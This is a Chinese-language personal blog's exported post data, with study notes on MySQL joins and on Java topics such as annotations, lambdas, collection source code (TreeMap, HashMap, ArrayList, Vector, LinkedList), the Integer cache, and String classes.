JOIN是返回左表的全部行和右表满足ON关系，如果左表的行在右表中没有匹配，那么这一行右表中对应数据就用NULL代替 SELECT * FROM names LEFT JOIN addresses ON names.id = addresses.id; RIGHT JOIN返回右表的全部行和左表满足ON条件的行，如果右表的行在左表中没有匹配，那么这一行左表中对应数据用NULL代替。 SELECT * FROM names RIGHT JOIN addresses ON names.id = addresses.id; 当然还有全连接FULL OUTER JOIN会从左表 和右表 那里返回所有的行。如果其中一个表的数据行在另一个表中没有匹配的行，那么对面的数据用NULL代替当然了，mysql中并不支持full outer join只能用union来替代 SELECT * FROM names LEFT JOIN addresses ON names.id = addresses.id UNION SELECT * FROM names RIGHT JOIN addresses ON names.id = addresses.id 因为上课不认真听讲，总是感觉学的不够全面，所以专门抽空补课了mysql的书，最近在看mysql 必知必会以上内容学习来自以下博客 https://www.cnblogs.com/tigerhsu/p/5113938.html https://www.cnblogs.com/reaptomorrow-flydream/p/8145610.html 亲力而为（力好像错了）","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"join","slug":"join","permalink":"http://yoursite.com/tags/join/"}]},{"title":"java annotation","slug":"java annotation","date":"2018-08-17T11:19:57.000Z","updated":"2020-11-14T17:11:16.194Z","comments":true,"path":"2018/08/17/java annotation/","link":"","permalink":"http://yoursite.com/2018/08/17/java%20annotation/","excerpt":"","text":"java annotation 注解官方解释： ****注解 是一系列元数据，它提供数据用来解释程序代码，但是注解并非是所解释的代码本身的一部分。注解对于代码的运行效果没有直接影响注解有很多好处 ，主要如下：-提供信息给编译器：编译器可以利用注解来探测错误和警告信息-编译阶段时的处理：软件工具可以利用注解信息来生成代码，Html文档或者其他相应处理-运行时的处理：某些注解可以在程序运行的时候接受代码的提取 首先讲解一下annotation具体的表现形式： package com.husky.reflection.main.annotation; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; @Retention(RetentionPolicy.RUNTIME) public @interface Check { } package com.husky.reflection.main.annotation; import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; /** * @author husky * 注释@TableSQL，只定义一个value值来映射表名，默认值为空。 * 如果程序不给此值，将使用类名（小写）来作为表名 * */ @Target(ElementType.TYPE)//定义注释应用于类 @Retention(RetentionPolicy.RUNTIME)//定义注释在jvm运行时保留 public @interface TableSQL { String value() default &quot;&quot;; } package com.husky.reflection.main.annotation; import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; @Target(ElementType.FIELD)//定义注解应用于成员变量 @Retention(RetentionPolicy.RUNTIME)//定义注解在jvm运行时保留 public @interface TableColumnSQL { String value() default &quot;&quot;; Constraint constraint() default @Constraint(); }注解运用的地方很多：可以给类加注解，也可以给变量加注解，等等具体如下：给类加注解 @TestAnnotation() public class Test {}给变量加注解 @Check(&quot;hi&quot;) int a;*如果没有用来读取注解的工具，那注解将没有任何作用，它也不会比注释更有用。读取注解的工具叫作注解处理器。java提供了两种方式来处理注解：第一种是利用运行时反射机制；另一种使用java提供的api来处理编译期的注解* 这就运用到了javareflection反射，在运行时，通过获取class，然后通过getDeclaredAnnotations()获取类的Annotation，根据类的Annotation来实现一些动作 当然，通过class获取所有变量Field，然后根据变量Field获取Annotation来实现一些动作 下面：具体讲解几个在应用中的@Test是junit框架中注解 public class ExampleUnitTest { @Test public void addition_isCorrect() throws Exception { assertEquals(4, 2 + 2); } }ButterKnifeandroid中的ioc框架 public class MainActivity extends AppCompatActivity { @BindView(R.id.tv_test) TextView mTv; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); ButterKnife.bind(this); } }当然还有一些注入，@Resource，@AutoWried什么的 具体的小实例：可以参考以下两个例子 对类中方法进行测试 通过对类进行注解来生成建表语句 具体源码在 可能会慢一点，明天肯定会上传成功 本文章参考于： https://blog.csdn.net/briblue/article/details/73824058 https://blog.zenfery.cc/hexo/articles/annotation-2.html http://ifeve.com/java-reflection/ 今天是七夕，准备出去夜跑，大家快乐","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"反射","slug":"反射","permalink":"http://yoursite.com/tags/%E5%8F%8D%E5%B0%84/"}]},{"title":"java8 lambda","slug":"java8 lambda","date":"2018-08-08T07:10:11.000Z","updated":"2020-11-14T17:11:16.699Z","comments":true,"path":"2018/08/08/java8 lambda/","link":"","permalink":"http://yoursite.com/2018/08/08/java8%20lambda/","excerpt":"","text":"*1.匿名内部类 * @Test public void oldRunable(){ new Thread(new Runnable() { @Override public void run() { System.out.println(&quot;the old runable now is using&quot;); } }).start(); } @Test public void runable(){ new Thread(() -&gt; System.out.println(&quot;It&apos;s lambda function&quot;)).start(); } //最后输出 //the old runable now is using //It&apos;s lambda function*2.lambda对集合的操作 *对list遍历 @Test public void iterTest(){ List&lt;String&gt; languages = Arrays.asList(&quot;java&quot;,&quot;python&quot;,&quot;scala&quot;); //before java8 for(String language : languages){ System.out.println(language); } //after java8 languages.stream().forEach(x-&gt;System.out.println(x)); //此处stream是java8中的新的一种方式，你会发现写了stream()的和下面的一句没有区别，这种是java8中的流式API，我将在下一篇博客专门写这个流式api languages.forEach(x-&gt;System.out.println(x); //此处也是对匿名内部类写成了lambda形式 languages.forEach(new Consumer&lt;String&gt;() { @Override public void accept(String s) { System.out.println(s); } }); languages.forEach(System.out::println);//这句也是可以的 }*3.用lambda表达式实现map *map是函数式编程里面重要的函数，就是将一个对象转换为另一个 @Test public void mapTest(){ List&lt;Double&gt; cost = Arrays.asList(10.0,200.0,30.0,100.0,200.0); cost.stream().map(x-&gt;x+x*0.5).forEach(System.out::println); } /** 输出结果 15.0 300.0 45.0 150.0 300.0 */*4.lambda实现map和reduce *map和reduce一样，map是将一个对象转化为另一个，而reduce是将多个转化为一个 @Test public void mapReduceTest(){ List&lt;Double&gt; cost = Arrays.asList(10.0,20.0,30.0); Double allCost = cost.stream().map(x-&gt;x+0.5*x).reduce((sum,x)-&gt;sum+x).get(); //此处就是流（stream）式api // Double allCost2 = cost.stream().map(x-&gt;x+0.5*x).reduce(new BinaryOperator&lt;Double&gt;() { // @Override // public Double apply(Double aDouble, Double aDouble2) { // return aDouble+aDouble2; // } // }).get(); System.out.println(allCost); } //输出结果 //90.0在java8之前 @Test public void sumTest(){ List&lt;Double&gt; cost = Arrays.asList(10.0,20.0,30.0); double sum = 0.0; for(double each : cost){ each += each * 0.5; sum += each; } System.out.println(sum); }*5.filter *filter是筛选 @Test public void filterTest(){ List&lt;Double&gt; cost = Arrays.asList(10.0,20.0,30.0,40.0); cost.stream().filter(x-&gt;x&gt;25).forEach(x-&gt;System.out.println(x)); // cost.stream().filter(new Predicate&lt;Double&gt;() { // @Override // public boolean test(Double aDouble) { // if(aDouble &gt;10.0){ // return true; // }else { // return false; // } // } // }).forEach(x-&gt;System.out.println(x)); }*6.与函数式接口Predicate配合 *除了在语言层面支持函数式编程风格，Java 8也添加了一个包，叫做java.util.function。它包含了很多类，用来支持Java的函数式编程。其中一个便是Predicate，使用java.util.function.Predicate函数式接口以及lambda表达式，可以向API方法添加逻辑，用更少的代码支持更多的动态行为。Predicate接口非常适用于做过滤。 public static void filterTest(List&lt;String&gt; langeages,Predicate&lt;String&gt; condition){ langeages.stream().filter(x-&gt;condition.test(x)).forEach(System.out::println); } @Test public void filterTestDemo(){ List&lt;String&gt; languages = Arrays.asList(&quot;Java&quot;,&quot;Python&quot;,&quot;Scale&quot;,&quot;Shell&quot;,&quot;R&quot;); System.out.println(&quot;Languages starts with J:&quot;); filterTest(languages,x-&gt;x.startsWith(&quot;J&quot;)); System.out.println(&quot;Languages end with a&quot;); filterTest(languages,x-&gt;x.endsWith(&quot;a&quot;)); System.out.println(&quot;All languages:&quot;); filterTest(languages,x-&gt;true); System.out.println(&quot;No languages&quot;); filterTest(languages,x-&gt;false); System.out.println(&quot;Language longer than 4&quot;); filterTest(languages,x-&gt;x.length()&gt;4); } /** 输出结果 Languages starts with J: Java Languages end with a Java All languages: Java Python Scale Shell R No languages Language longer than 4 Python Scale Shell */*7.TreeMap *person.java package com.husky; public class Person { private String name; public Person(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return &quot;Person{&quot; + &quot;name=&apos;&quot; + name + &apos;\\&apos;&apos; + &apos;}&apos;; } } @Test public void treeMapTest(){ TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person,Integer&gt;((o1, o2) -&gt; o1.getName().compareTo(o2.getName())); Person person = new Person(&quot;husky&quot;); Person person1 = new Person(&quot;adios&quot;); Person person2 = new Person(&quot;husky&quot;); treeMap.put(person,1); treeMap.put(person1,2); treeMap.put(person2,3); Iterator&lt;Map.Entry&lt;Person,Integer&gt;&gt; it = treeMap.entrySet().iterator(); while(it.hasNext()){ Map.Entry&lt;Person,Integer&gt; m = it.next(); System.out.println(m.getKey()); System.out.println(m.getValue()); } } //输出结果 /** Person{name=&apos;adios&apos;} 2 Person{name=&apos;husky&apos;} 3 */ 超链接学习","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"TreeMap源码阅读","slug":"TreeMap源码阅读","date":"2018-07-19T04:40:21.000Z","updated":"2020-11-14T17:11:17.217Z","comments":true,"path":"2018/07/19/TreeMap源码阅读/","link":"","permalink":"http://yoursite.com/2018/07/19/TreeMap%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/","excerpt":"","text":"基本结构 private final Comparator&lt;? super K&gt; comparator; private transient Entry&lt;K,V&gt; root; //根节点 /** * The number of entries in the tree */ private transient int size = 0; //元素个数 /** * The number of structural modifications to the tree. */ private transient int modCount = 0; //树结构修改数 //下面是根节点的结构，红黑树 static final class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; { K key; V value; Entry&lt;K,V&gt; left; Entry&lt;K,V&gt; right; Entry&lt;K,V&gt; parent; boolean color = BLACK; /** * Make a new cell with given key, value, and parent, and with * {@code null} child links, and BLACK color. */ Entry(K key, V value, Entry&lt;K,V&gt; parent) { this.key = key; this.value = value; this.parent = parent; } }put public V put(K key, V value) { Entry&lt;K,V&gt; t = root;//根节点 if (t == null) {//如果entry当中还没有数据，初始化 compare(key, key); // type (and possibly null) check root = new Entry&lt;&gt;(key, value, null); size = 1;//元素个数1 modCount++;//树结构修改+1 return null; } int cmp; Entry&lt;K,V&gt; parent; // split comparator and comparable paths Comparator&lt;? super K&gt; cpr = comparator;//这个值可以在TreeMap构造函数出初始化 if (cpr != null) {//接下来就是通过判断是否在TreeMap初始化时初始化了Comparator，如果是，来left和right，但=0时，直接替换掉 do { parent = t; cmp = cpr.compare(key, t.key); if (cmp &lt; 0) t = t.left; else if (cmp &gt; 0) t = t.right; else return t.setValue(value); } while (t != null); } else {//如果没有初始化Comparator，就从比较的object key中取出Comparable，也就是key中impements Comparable接口 if (key == null) throw new NullPointerException(); @SuppressWarnings(&quot;unchecked&quot;) Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key; do { parent = t; cmp = k.compareTo(t.key); if (cmp &lt; 0) t = t.left; else if (cmp &gt; 0) t = t.right; else return t.setValue(value); } while (t != null); } Entry&lt;K,V&gt; e = new Entry&lt;&gt;(key, value, parent);//找到后，新建节点，根据cmp结果放在左边右边 if (cmp &lt; 0) parent.left = e; else parent.right = e; fixAfterInsertion(e); size++; modCount++; return null; }get public V get(Object key) { Entry&lt;K,V&gt; p = getEntry(key); return (p==null ? null : p.value); } final Entry&lt;K,V&gt; getEntry(Object key) { // Offload comparator-based version for sake of performance if (comparator != null)//这边是treeMap实现了Comparator接口 return getEntryUsingComparator(key); if (key == null) throw new NullPointerException(); @SuppressWarnings(&quot;unchecked&quot;) Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key; Entry&lt;K,V&gt; p = root; while (p != null) {//这边是，没实现，但是key这个object中实现了Comparable接口 int cmp = k.compareTo(p.key); if (cmp &lt; 0) p = p.left; else if (cmp &gt; 0) p = p.right; else return p; } return null; } final Entry&lt;K,V&gt; getEntryUsingComparator(Object key) {\\\\这边是treeMap实现了Comparator接口 @SuppressWarnings(&quot;unchecked&quot;) K k = (K) key; Comparator&lt;? super K&gt; cpr = comparator; if (cpr != null) { Entry&lt;K,V&gt; p = root; while (p != null) { int cmp = cpr.compare(k, p.key); if (cmp &lt; 0) p = p.left; else if (cmp &gt; 0) p = p.right; else return p; } } return null; } \\\\具体查询就树遍历一样，用存放的规则再来寻找 结论首先，如果想要存入进TreeMap中，首先有前提， TreeMap初始化的时候要实现Comparator接口，并重写compare方法 *或者是***TreeMap存入的key这个object实现了Comparable接口，并重写了compareTo方法 下面实现两个方法1.object key中实现Comparable接口 public class Person implements Comparable&lt;Person&gt; { private String name; public Person(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return &quot;Person{&quot; + &quot;name=&apos;&quot; + name + &apos;\\&apos;&apos; + &apos;}&apos;; } @Override public int compareTo(Person o) { if(this.name.equals(o.getName())){//这个地方，我将相同的信息，返回1，不同返回-1，当然这不符合逻辑，我只是尝试一下 return 1; }else{ return -1; } } } import java.util.*; public class TreeMapDemo { public static void main(String[] args){ TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person, Integer&gt;(); treeMap.put(new Person(&quot;husky&quot;),1); treeMap.put(new Person(&quot;husky&quot;),2); treeMap.put(new Person(&quot;husky&quot;),3); Set&lt;Map.Entry&lt;Person,Integer&gt;&gt; entry = treeMap.entrySet(); for(Map.Entry&lt;Person,Integer&gt; e:entry){ System.out.println(e.getKey().getName()+&quot; &quot;+e.getValue()); } } } //输出结果 /** husky 1 husky 2 husky 3 */2.TreeMap初始化是，初始化了Comparator接口 public class Person { private String name; public Person(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return &quot;Person{&quot; + &quot;name=&apos;&quot; + name + &apos;\\&apos;&apos; + &apos;}&apos;; } } import java.util.*; public class TreeMapDemo { public static void main(String[] args){ TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person, Integer&gt;(new Comparator&lt;Person&gt;() { @Override public int compare(Person o1, Person o2) { if (o1.getName().equals(o2)){ return 1; }else { return -1; } } }); treeMap.put(new Person(&quot;husky&quot;),1); treeMap.put(new Person(&quot;husky&quot;),2); treeMap.put(new Person(&quot;husky&quot;),3); Set&lt;Map.Entry&lt;Person,Integer&gt;&gt; entry = treeMap.entrySet(); for(Map.Entry&lt;Person,Integer&gt; e:entry){ System.out.println(e.getKey().getName()+&quot; &quot;+e.getValue()); } } } /** husky 3 husky 2 husky 1 */参考博客 java集合（6）：TreeMap源码分析（jdk1.8）","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"面试题","slug":"面试题","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"面试","slug":"面试","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95/"},{"name":"treemap","slug":"treemap","permalink":"http://yoursite.com/tags/treemap/"}]},{"title":"HashMap存入数据时源码阅读","slug":"HashMap存入数据时源码阅读","date":"2018-07-18T10:57:28.000Z","updated":"2020-11-14T17:11:17.988Z","comments":true,"path":"2018/07/18/HashMap存入数据时源码阅读/","link":"","permalink":"http://yoursite.com/2018/07/18/HashMap%E5%AD%98%E5%85%A5%E6%95%B0%E6%8D%AE%E6%97%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/","excerpt":"","text":"首先java版本1.8首先确定的是，HashMap的存储结构约定在前面的是桶在桶后面的链表是bin源码 //hashmap中的put方法 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); //调用的是object的hashcode，所以我们要修改时要将key的hashcode修改，以及在下面putVal中会调用到equals方法。 //&gt;&gt;&gt; ,&gt;&gt; ,&lt;&lt; 是java中仅有的移位运算符.&gt;&gt;&gt;是无符号右移 } final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; //此处是||，所以分为两种情况，第一种table为空，初始化table，第二种将tab.length赋给n if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null);//判断通过hash运算后的tab上是否有值，如果没有，就新建 else { Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p;//如果两个key相同，将p给赋给e，会在下方判断e是否为空，如果不为空，将原来的oldVal = newVal； else if (p instanceof TreeNode) //此处判断是否是红黑树 e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);// else {//当前还是为链表 for (int binCount = 0; ; ++binCount) { if ((e = p.next) == null) { p.next = newNode(hash, key, value, null);//从当前bin中遍历，遍历到最后，在末尾newNode，插入值 if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st //此处已经大于TREEIFY_THRESHOLD，所有链表变成红黑树 treeifyBin(tab, hash); break; } if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; } } if (e != null) { // existing mapping for key //key值存在，就替换 V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; } } ++modCount; if (++size &gt; threshold)//扩容 resize(); afterNodeInsertion(evict); return null; }还有具体扩容变换过程，可以参考以下博客 HashMap的扩容及树化过程 具体参考了以下几篇博客： https://blog.csdn.net/lianhuazy167/article/details/66967698 https://blog.csdn.net/fan2012huan/article/details/51088211 https://blog.csdn.net/u013412772/article/details/80748604 看了一下午的源码，终于算有个大致了解了","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"面试题","slug":"面试题","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"hashmap","slug":"hashmap","permalink":"http://yoursite.com/tags/hashmap/"}]},{"title":"对比Vector、ArrayList、LinkedList有何区别","slug":"对比Vector、ArrayList、LinkedList有何区别","date":"2018-07-17T08:24:27.000Z","updated":"2020-11-14T17:11:18.558Z","comments":true,"path":"2018/07/17/对比Vector、ArrayList、LinkedList有何区别/","link":"","permalink":"http://yoursite.com/2018/07/17/%E5%AF%B9%E6%AF%94Vector%E3%80%81ArrayList%E3%80%81LinkedList%E6%9C%89%E4%BD%95%E5%8C%BA%E5%88%AB/","excerpt":"","text":"这三者都是实现集合框架的List，也就是所谓的有序集合，因此具体功能都实现了按照位置进行定位，修改，添加或者删除，都提供了迭代器以遍历其内容，但因为具体设计不同，在行为，性能，线程安全等方面，表现又有很大不同。Vector是java早期提供的线程安全的动态数组，但数据满时，自动扩容，会创建新的数组，并拷贝原有的数组。ArrayList是应用更广泛的动态数组，它本身是线程不安全的，所以性能会好很多，扩容时，和vector不一样，vector是扩大一倍，而ArrayList是增加50%。LinkedList是java提供的双向链表，它不是线程安全的，也需要向上面两种调整容量。 知识扩展 1.Vector和ArrayList作为动态数组，它内部是数组实现的，十分便于随机访问，除了尾部插入数据，或者删除数据时，性能是相对较差的。比如我们在中部插入数据，需要后移所有数据。2.LinkedList进行结点插入删除很高效，但是随机访问比动态数据慢很多。 源码 Vector //Vector protected Object[] elementData; //动态数组 public Vector(int initialCapacity) { this(initialCapacity, 0); } /** * Constructs an empty vector so that its internal data array * has size {@code 10} and its standard capacity increment is * zero. */ public Vector() { this(10); } //初始化动态数组默认大小为10 public synchronized boolean add(E e) { modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true; } private void ensureCapacityHelper(int minCapacity) { // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity); } private void grow(int minCapacity) { // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ? capacityIncrement : oldCapacity); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); elementData = Arrays.copyOf(elementData, newCapacity); } //这边可以看出，扩容时，是扩大一倍。 int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ?capacityIncrement : oldCapacity); public synchronized int indexOf(Object o, int index) { if (o == null) { for (int i = index ; i &lt; elementCount ; i++) if (elementData[i]==null) return i; } else { for (int i = index ; i &lt; elementCount ; i++) if (o.equals(elementData[i])) return i; } return -1; } //定位时会对object进行判断，如果是null，用==判断，如果不是null，用equals public synchronized Iterator&lt;E&gt; iterator() { return new Itr(); } /** * An optimized version of AbstractList.Itr */ private class Itr implements Iterator&lt;E&gt; { int cursor; // index of next element to return int lastRet = -1; // index of last element returned; -1 if no such int expectedModCount = modCount; public boolean hasNext() { // Racy but within spec, since modifications are checked // within or after synchronization in next/previous return cursor != elementCount; } public E next() { synchronized (Vector.this) { checkForComodification(); int i = cursor; if (i &gt;= elementCount) throw new NoSuchElementException(); cursor = i + 1; return elementData(lastRet = i); } } } //对vector进行遍历也就方便了 Iterator&lt;String&gt; it = vector.iterator(); while(it.hasNext()){ System.out.println(it.next()); }ArrayList transient Object[] elementData; //动态数组 private void grow(int minCapacity) { // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity); } //扩容时，是&gt;&gt;1,也就是/2。所以，就是扩容50%。 public boolean add(E e) { ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true; } //线程不安全LinkedList transient int size = 0; /** * Pointer to first node. * Invariant: (first == null &amp;&amp; last == null) || * (first.prev == null &amp;&amp; first.item != null) */ transient Node&lt;E&gt; first; /** * Pointer to last node. * Invariant: (first == null &amp;&amp; last == null) || * (last.next == null &amp;&amp; last.item != null) */ transient Node&lt;E&gt; last; //两个链表 public boolean add(E e) { linkLast(e); return true; } void linkLast(E e) { final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++; } //当然还有pop，push方法，linkedList不仅仅继承了AbstractList而且继承了Deque，可以实现双向队列使用","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"面试题","slug":"面试题","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"面试","slug":"面试","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"int 和 Integer 有什么区别？谈谈 Integer缓存值的范围","slug":"int 和 Integer 有什么区别？谈谈 Integer缓存值的范围","date":"2018-07-17T06:52:32.000Z","updated":"2020-11-14T17:11:19.040Z","comments":true,"path":"2018/07/17/int 和 Integer 有什么区别？谈谈 Integer缓存值的范围/","link":"","permalink":"http://yoursite.com/2018/07/17/int%20%E5%92%8C%20Integer%20%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F%E8%B0%88%E8%B0%88%20Integer%E7%BC%93%E5%AD%98%E5%80%BC%E7%9A%84%E8%8C%83%E5%9B%B4/","excerpt":"","text":"首先int是原始数据类型，在java中有8个这样的原始数据类型，分别为：int，short，boolean，byte，char，float，double，long。java当中一切皆是对象，但基本数据类型除外。Integer是int的包装，它有一个int类型的字段存储数据，并且提供了基本操作，比如数学运算，位运算等。在java5中引入了自动装箱，自动拆箱的功能，极大简化了相关编程。Integer缓存值，这个问题，在广实践中，大量的数据操作中，都是集中在有限，较小的数据范围内，在java5中新增了静态工厂方法valueOf（），在调用它的时候，会运用到缓存机制，带来明显的性能提升。按照javadoc，这个值默认 缓存范围是-128~127. 知识点扩展1.自动装箱，和自动拆箱自动装箱其实是一种语法糖，可以简单理解为java平台为我们自动进行一些转化，保证不同写法在运行时等价，他们发生在 编译阶段，也就是生成的字节码是相同的。 Integer integer = 1; int unboxing = integer ++;反编译输出 1: invokestatic #2 java/lang/Integer.valueOf:(I)Ljava/lang/Integer; 8: invokevirtual #3 java/lang/Integer.intValue:()I这种缓存机制不是只有Integer实现了，同样存在于其他的包装类中。如Boolean Boolean.TRUE,Boolean.False，Short-128~127，Byte 全部缓存，Character 缓存范围 ‘\\u0000’ 到 ‘\\u007F’。原则上建议避免自动装箱，拆箱行为，尤其是在性能敏感。 public static Integer valueOf(String s, int radix) throws NumberFormatException { return Integer.valueOf(parseInt(s,radix)); } public static Integer valueOf(String s) throws NumberFormatException { return Integer.valueOf(parseInt(s, 10)); } //以上是valueof public static Integer valueOf(int i) { if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } private static class IntegerCache { static final int low = -128; static final int high; static final Integer cache[]; static { // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty(&quot;java.lang.Integer.IntegerCache.high&quot;); if (integerCacheHighPropValue != null) { try { int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); } catch( NumberFormatException nfe) { // If the property cannot be parsed into an int, ignore it. } } high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127; } private IntegerCache() {} }从上面我们可以看出，在创建Integer对象时，会调用public static Integer valueOf(int i)，其中就会判断该数值是否是在缓存值范围内，如果是，则返回一个已经创建好的Intger对象，也就是在IntegerCache中创建的Integer缓存数组，如果不在这个范围内，就直接new一个Integer。当然，这个缓存值默认是-128~127 ，但是是可以修改的，在vm中修改即可调整缓存大小。","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"面试题","slug":"面试题","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"面试","slug":"面试","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"string，stringBuffer，stringBuilder区别","slug":"string，stringBuffer，stringBuilder区别","date":"2018-07-12T11:08:48.000Z","updated":"2020-11-14T17:11:19.639Z","comments":true,"path":"2018/07/12/string，stringBuffer，stringBuilder区别/","link":"","permalink":"http://yoursite.com/2018/07/12/string%EF%BC%8CstringBuffer%EF%BC%8CstringBuilder%E5%8C%BA%E5%88%AB/","excerpt":"","text":"string public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence { /** The value is used for character storage. */ private final char value[];从这里可以看出，string是明显的immutable类，被修饰为finalclass，而且方法都被final修饰，所以拼接，剪裁等方法都new新的string。为了避免大量的string被创建，其运行机制是：创建一个字符串时，首先检查池中是否有值相同的字符串对象，如果有则不需要创建直接从池中刚查找到的对象引用；如果没有则新建字符串对象，返回对象引用，并且将新创建的对象放入池中。但是，通过new方法创建的String对象是不检查字符串池的，而是直接在堆区或栈区创建一个新的对象，也不会把对象放入池中。上述原则只适用于通过直接量给String对象引用赋值的情况。 举例：String str1 = “123”; //通过直接量赋值方式，放入字符串常量池String str2 = new String(“123”);//通过new方式赋值方式，不放入字符串常量池 注意：String提供了intern()方法。调用该方法时，如果常量池中包括了一个等于此String对象的字符串（由equals方法确定），则返回池中的字符串。否则，将此String对象添加到池中，并且返回此池中对象的引用。 2.stringBuffer3.stringBuilderstringBuffer和stringBuilder都继承了AbstractStringBuilder，提供了几乎一样方法。 abstract class AbstractStringBuilder implements Appendable, CharSequence { /** * The value is used for character storage. */ char[] value;可以看出这个地方，不是用final修饰的，所以添加，等方法时不会new 对象。 但是，stringBuffer和StringBuilder是有不同的，StringBuffer所有方法都是被synchronized修饰的 @Override public synchronized int length() { return count; } @Override public synchronized int capacity() { return value.length; } @Override public synchronized void ensureCapacity(int minimumCapacity) { super.ensureCapacity(minimumCapacity); }也就是说stringBuffer是线程安全的，但安全的代价是，性能的降低。","categories":[],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"java面试","slug":"java面试","permalink":"http://yoursite.com/tags/java%E9%9D%A2%E8%AF%95/"}]},{"title":"final和finally和finalize之间区别","slug":"final和finally和finalize之间区别","date":"2018-07-10T10:35:56.000Z","updated":"2020-11-14T17:11:20.126Z","comments":true,"path":"2018/07/10/final和finally和finalize之间区别/","link":"","permalink":"http://yoursite.com/2018/07/10/final%E5%92%8Cfinally%E5%92%8Cfinalize%E4%B9%8B%E9%97%B4%E5%8C%BA%E5%88%AB/","excerpt":"","text":"final：可以用来修饰类，变量，方法final类：不可继承扩展final变量：不可更改final方法：不可override finally：是java中保证重点代码一定被执行的机制，有try-catch-finally和try-finally来关闭jdbc连接，保证unlock等动作 try { // do something System.exit(1); } finally{ System.out.println(“Print from finally”); 